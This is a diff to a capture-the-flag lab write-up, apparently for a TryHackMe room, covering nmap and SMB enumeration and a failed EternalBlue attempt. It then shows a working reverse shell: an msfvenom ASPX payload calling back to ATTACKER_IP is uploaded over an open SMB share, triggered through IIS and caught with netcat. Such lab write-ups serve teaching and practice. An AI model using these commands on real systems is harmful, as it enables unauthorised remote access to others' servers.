@@ -25,12 +25,8 @@ Note - Nothing in this room requires Metasploit
 ## Start of with NMAP scan
 
 ```
-┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
-└─$ nmap -Pn -sV -sC 10.49.151.205  
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 02:57 AEST
-Nmap scan report for 10.49.151.205
-Host is up (0.41s latency).
-Not shown: 995 filtered tcp ports (no-response)
+└─$ nmap -Pn -sV -sC THM_Target 
+...
 PORT     STATE SERVICE       VERSION
 80/tcp   open  http          Microsoft IIS httpd 10.0
 | http-methods: 
@@ -109,7 +105,25 @@ Host script results:
 ```
 Interesting points here
 - ms17-010 definitely has a RCE capability, eternal blue (CVE-2017-0143)
+- smb1 should be required and was varified in next protocol check
 
+SMB protocol check with nmap:
+```
+└─$ nmap -Pn -p445 --script smb-protocols THM_Target              
+...
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-protocols: 
+|   dialects: 
+|     NT LM 0.12 (SMBv1) [dangerous, but default]
+|     2:0:2
+|     2:1:0
+|     3:0:0
+|     3:0:2
+|_    3:1:1
+```
 Nmap -sC only includes a range of common ports so one more for full range of ports
 ```
 └─$ nmap -Pn -p- -sV THM_Target 
@@ -128,7 +142,13 @@ PORT      STATE SERVICE       VERSION
 49667/tcp open  msrpc         Microsoft Windows RPC
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 ```
-In browser the IP showed a just a basic IIS web server default page. GoBuster here no directories were discovered on port 80 for website. A second scan for port 49663.
+In browser the IP showed a just a basic IIS web server default page. GoBuster here no directories were discovered on port 80 for website. A second scan with gobuster with various wordlists
+
+#
+#
+#
+#
+#
 
 ## Starting now with SMB
 
@@ -237,8 +257,61 @@ Microsoft Windows Server 2008 R2 (x64) - ' | windows_x86-64/remote/41987.py
 Shellcodes: No Results
 
 ```
-The last one is closest match 41987.py 
+The last one is closest match 41987.py, tested and fails for unknown reason also ms17_010 metasploit exploit failed just states 
+ms17_010 not vulnerable:
+```
+msf > use exploit/windows/smb/ms17_010_eternalblue
+...
+set LHOST,RHOST,LPORT then run
+...
+[*] 10.49.167.151:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[-] 10.49.167.151:445     - Rex::ConnectionTimeout: The connection with (10.49.167.151:445) timed out.
+[*] 10.49.167.151:445     - Scanned 1 of 1 hosts (100% complete)
+[-] 10.49.167.151:445 - The target is not vulnerable.
+[*] Exploit completed, but no session was created.
+```
+So skip that, but SMB is clearly able to access a share so with msfvenom there are exploit options with or without meterpreter:
 
+Without meterpreter:
+- start a netcat listener
+- create msfvenom exploit windows/x64/shell_reverse_tcp
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx > exploit.aspx
+```
+- use smb as before but use put command to upload the exploit:
+```
+~# smbclient \\\\THM_Target\\nt4wrksv
+Password for [WORKGROUP\root]:
+Try "help" to get a list of possible commands.
+smb: \> put exploit.aspx
+putting file exploit.aspx as \exploit.aspx (551.4 kb/s) (average 551.4 kb/s)
+```
+- Then access it from the browswer with http://THM_Target:49663/nt4wrksv/exploit.aspx and should link to netcat:
+```
+root@<AttackerIP>:~# nc -lnvp 4444
+Listening on 0.0.0.0 4444
+Connection received on THM_Target 49855
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+iis apppool\defaultapppool
+
+c:\windows\system32\inetsrv>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
 
 Meterpreter results
 ```
